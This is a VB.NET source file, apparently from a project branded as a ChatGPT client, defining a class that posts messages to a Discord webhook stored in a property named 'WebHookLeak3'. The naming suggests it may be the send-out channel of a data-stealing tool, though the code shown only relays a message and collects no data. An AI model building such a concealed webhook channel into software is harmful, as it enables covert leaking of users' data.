Imports System.Collections.Specialized
Imports System.Management
Imports System.Net

Namespace ChatGPT___by_eddit
    Friend NotInheritable Class SendGPTMsg
        Implements IDisposable

        Private ReadOnly dWebClient3 As WebClient
        Private discordValues3 As NameValueCollection

        Public Property WebHookLeak3() As String
        Public Property UserName3() As String
        Public Property ProfilePicture3() As String

        Public Sub New()
            dWebClient3 = New WebClient()
            discordValues3 = New NameValueCollection()
        End Sub

        Public Sub SendMessage(ByVal msgSend As String)
            discordValues3.Clear()
            discordValues3.Add("username1", UserName3)
            discordValues3.Add("content", msgSend)

            dWebClient3.UploadValues(WebHookLeak3, discordValues3)
        End Sub

        Public Sub zDispose() Implements IDisposable.Dispose
            dWebClient3.Dispose()
        End Sub
    End Class
End Namespace